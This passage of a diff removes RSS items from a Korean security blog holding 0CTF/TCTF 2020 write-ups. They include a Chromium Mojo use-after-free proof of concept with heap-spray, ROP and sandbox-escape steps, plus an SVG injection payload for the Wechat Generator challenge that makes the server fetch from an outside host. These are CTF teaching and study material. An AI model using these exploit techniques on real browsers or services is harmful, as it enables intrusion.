-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;취약점은 CreateInstance 함수에서 발생합니다. TInstance를 생성할 때 인자로 inner_db_를 raw pointer로 전달합니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &quot;content/browser/tstorage/inner_db_impl.h&quot;
-&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;InnerDbImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InnerDbImpl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;InnerDbImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InnerDbImpl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
-
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InnerDbImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;queue_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;하지만 inner_db_가 free될 때 따로 TInstance에 대한 처리가 없기 때문에 TInstance는 그대로 raw pointer를 가지고 있게 됩니다. 따라서 UAF 취약점이 발생합니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;../mojo_bindings.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;../third_party/blink/public/mojom/tstorage/tstorage.mojom.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;TStoragePtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;Mojo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bindInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;TStorage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mojo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;functioin&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ins1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-  &lt;span class=&quot;c1&quot;&gt;// heap spray&lt;/span&gt;
-	&lt;span class=&quot;nx&quot;&gt;ins1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getTotalSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;위와 같은 코드로 poc를 작성할 수 있습니다. &lt;code class=&quot;highlighter-rouge&quot;&gt;ins1.getTotalSize();&lt;/code&gt;은 free된 inner_db_를 사용하므로 만약 &lt;code class=&quot;highlighter-rouge&quot;&gt;getTotalSize&lt;/code&gt; 를 호출하기 전에 heap spray를 통해 inner_db_를 덮어쓴다면 원하는 주소로 rip를 변경할 수 있게 됩니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;InnerDbImpl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InnerDb&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nl&quot;&gt;public:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;InnerDbImpl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InnerDbImpl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-        &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SetInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SetDouble&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetDouble&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetTotalSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;queue&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;queue_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;int64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;int_value_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;double_value_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;또한 InnerDbImpl class를 보면 queue_가 존재하고 기능중에 그 queue_에 값을 push 하거나 pop할 수 있는 기능이 존재합니다. 따라서 free된 InnerDbImpl를 heap spray를 통해 덮어쓴다면 queue_가 내부적으로 가르키고 있는 주소를 변경하여 arbitrary address read/write가 가능해집니다. 그래서 rip를 변경할 수 있는 기능과 원하는 메모리 주소를 읽고 쓸 수 있는 기능을 통해 sandbox를 escape할 수 있습니다.&lt;/p&gt;
-
-&lt;h1 id=&quot;5-chromium-full-chain&quot;&gt;5. Chromium Full Chain&lt;/h1&gt;
-
-&lt;p&gt;Chromium Full Chain의 경우 대회때 시간이 부족하여 해결하지 못하고 대회가 끝난 뒤에 풀 수 있었습니다. 문제는 위 두가지 exploit을 체이닝하는 문제였는데 바뀐점이 array buffer가 ptmalloc을 사용하지 않게되고 원래 chrome에서 array buffer의 backing store를 할당할 때 사용하는 partition allocator를 사용하게 된 점입니다. 그래서 renderer exploit을 처음부터 새로 작성해야 했습니다.&lt;/p&gt;
-
-&lt;p&gt;먼저 취약점을 통해 free된 chunk에 next ptr을 덮어 chunk를 원하는곳에 할당할 수 있었습니다. 하지만 이전과 같이 libc leak이 존재하지 않기 때문에 바로 rip를 컨트롤하는게 불가능했습니다. 그래서 heap leak을 먼저 하고 chunk가 할당된 page 위쪽에 존재하는 slot을 이용해 text 주소를 leak 했습니다.&lt;/p&gt;
-
-&lt;p&gt;그리고 leak한 chrome binary 주소중 rw 권한이 있는 영역에 값을 쭉 덮어보면서 rip가 컨트롤 되는 부분을 찾았습니다. 이후 스택 피벗을 통해 ROP를 성공하여 쉘코드를 실행한 뒤에, RenderFrameImpl 객체를 찾아 enabled_bindings_을 2(BINDINGS_POLICY_MOJO_WEB_UI)로 변경하고 새로고침하면 Mojo를 활성화할 수 있었습니다. mojo를 활성화 한 다음엔, 이미 작성 했던 mojo exploit 코드를 그대로 사용하여 sandbox escape를 할 수 있었습니다.&lt;/p&gt;
-
-&lt;p&gt;대회 중에는 renderer에서 쉘코드를 실행시키는것까진 성공했지만 쉘코드 실행 이후 다시 정상적인 실행 흐름을 복구하는것에 삽질을 너무 많이해서 못풀었습니다. 시간이 좀 더 있었다면 풀 수 있었을 것 같습니다.&lt;/p&gt;
-</description>
-        <pubDate>Mon, 01 Jun 2020 00:00:00 +0000</pubDate>
-        <link>http://202.182.127.225:4000/2020-06-01/0ctf-Chromium-RCE-SBX-WriteUp</link>
-        <guid isPermaLink="true">http://202.182.127.225:4000/2020-06-01/0ctf-Chromium-RCE-SBX-WriteUp</guid>
-        
-        <category>pwn</category>
-        
-        <category>ctf</category>
-        
-        <category>write-up</category>
-        
-        
-      </item>
-    
-      <item>
-        <title>0CTF/TCTF 2020 - Wechat Generator, Cloud Computing v2</title>
-        <description>&lt;p&gt;라온화이트햇 핵심연구팀 최정수&lt;/p&gt;
-
-&lt;h2 id=&quot;0ctftctf-2020-quals&quot;&gt;0CTF/TCTF 2020 Quals&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;2020.06.27 11:00 ~ 2020.06.29 11:00 KST (48 Hour)&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;wechat-generator&quot;&gt;Wechat Generator&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Web
-261 Pts
-32 solved&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Come and check my latest innovation! It’s normal to encounter some bugs and glitches since it is still in beta development.
-&lt;a href=&quot;http://pwnable.org:5000/&quot;&gt;http://pwnable.org:5000/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/jeong61.png&quot; alt=&quot;/assets/jeong61.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Wechat Generator 문제의 컨셉은 입력한 내용을 바탕으로 Fake Wechat 이미지를 생성해주는 서비스입니다.&lt;/p&gt;
-
-&lt;p&gt;메인 페이지에서는 크게 &lt;code class=&quot;highlighter-rouge&quot;&gt;Preview&lt;/code&gt;와 &lt;code class=&quot;highlighter-rouge&quot;&gt;Share&lt;/code&gt; 기능이 존재합니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Preview&lt;/code&gt; 기능의 경우 서버로 요청과 응답 패킷은 아래와 같습니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST http://pwnable.org:5000/preview HTTP/1.1
-Host: pwnable.org:5000
-Connection: keep-alive
-Content-Length: 122
-Accept: application/json, text/javascript, */*; q=0.01
-X-Requested-With: XMLHttpRequest
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-Origin: http://pwnable.org:5000
-Referer: http://pwnable.org:5000/
-Accept-Encoding: gzip, deflate
-Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
-
-data=[{&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;},{&quot;type&quot;:1,&quot;message&quot;:&quot;Me too!!!&quot;}]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
-Server: gunicorn/19.10.0
-Date: Tue, 30 Jun 2020 06:38:45 GMT
-Connection: close
-Content-Type: application/json
-Content-Length: 95404
-
-{&quot;previewid&quot;:&quot;94e38e87-3554-4c0a-91c4-e31febc9c344&quot;,&quot;data&quot;:&quot;data:image/svg+xml;base64,(Base64 Encoded SVG data)&quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;대화 내용(data)을 넣고 요청하면 응답으로 &lt;code class=&quot;highlighter-rouge&quot;&gt;previewid&lt;/code&gt;와 &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt;를 받을 수 있습니다. &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt;는 Base64로 인코딩된 이미지이며 새로운 대화 내용을 화면에 출력시켜줍니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/jeong62.png&quot; alt=&quot;/assets/jeong62.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt;의 내용을 보면 &lt;code class=&quot;highlighter-rouge&quot;&gt;image/svg+xml&lt;/code&gt;을 확인 할 수 있고 Base64로 인코딩된 이미지 파일을 디코딩을 하면  위와 같이 svg로 생성된 이미지인 것을 확인할 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;Wechat Generator는 이모티콘(이모지)도 지원을 합니다. 이모티콘을 사용했을때 패킷을 보면 아래와 같습니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST http://pwnable.org:5000/preview HTTP/1.1
-Host: pwnable.org:5000
-Connection: keep-alive
-Content-Length: 133
-Accept: application/json, text/javascript, */*; q=0.01
-X-Requested-With: XMLHttpRequest
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-Origin: http://pwnable.org:5000
-Referer: http://pwnable.org:5000/
-Accept-Encoding: gzip, deflate
-Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
-
-data=[{&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;},{&quot;type&quot;:1,&quot;message&quot;:&quot;Me too!!![smile]!!!&quot;}]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
-Server: gunicorn/19.10.0
-Date: Tue, 30 Jun 2020 06:59:56 GMT
-Connection: close
-Content-Type: application/json
-Content-Length: 95676
-
-{&quot;previewid&quot;:&quot;412cf8f6-e141-41e9-bc95-dec8a01bc55d&quot;,&quot;data&quot;:&quot;data:image/svg+xml;base64,(Base64 Encoded SVG data)&quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Requests의 &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt;의 이모지는 &lt;code class=&quot;highlighter-rouge&quot;&gt;[smile]&lt;/code&gt; text 들어가며 Response의 &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt;를 디코딩 하여 살펴보면 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;image&amp;gt;&lt;/code&gt;로 치환되어 들어가는 것을 확인할 수 있습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;g&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;transform=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;translate(273 572)&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;text&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;font-family=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SimHei,SimHei&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;font-size=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;72&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Me too!!!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/text&amp;gt;&amp;lt;image&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;x=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;360&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;y=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-60&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;100&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:xlink=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/1999/xlink&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xlink:href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://pwnable.org:5000/static/emoji/smile.png&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;text&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;x=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;460&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;font-family=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SimHei,SimHei&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;font-size=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;72&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;!!!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/text&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/g&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[smile] -&amp;gt; &amp;lt;/text&amp;gt;&amp;lt;image x=&quot;360&quot; y=&quot;-60&quot; height=&quot;100&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;http://pwnable.org:5000/static/emoji/smile.png&quot; /&amp;gt;&amp;lt;text x=&quot;460&quot; font-family=&quot;SimHei,SimHei&quot; font-size=&quot;72&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;따라서 아래와 같은 요청으로 이미지를 임의로 삽입할 수 있습니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[{&quot;type&quot;:0,&quot;message&quot;:&quot;[smile.png\&quot;/&amp;gt;&amp;lt;image xmlns:xlink=\&quot;http://www.w3.org/1999/xlink\&quot; xlink:href=\&quot;http://u1804.jeong.su:8888/\&quot;/&amp;gt;&amp;lt;test x=\&quot;]&quot;}]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;단, 요청은 &lt;code class=&quot;highlighter-rouge&quot;&gt;preview&lt;/code&gt; 기능이 아닌 &lt;code class=&quot;highlighter-rouge&quot;&gt;Share&lt;/code&gt; 기능을 사용할때 &lt;code class=&quot;highlighter-rouge&quot;&gt;ImageMagick&lt;/code&gt;에 의해 랜더링됩니다.&lt;/p&gt;
-
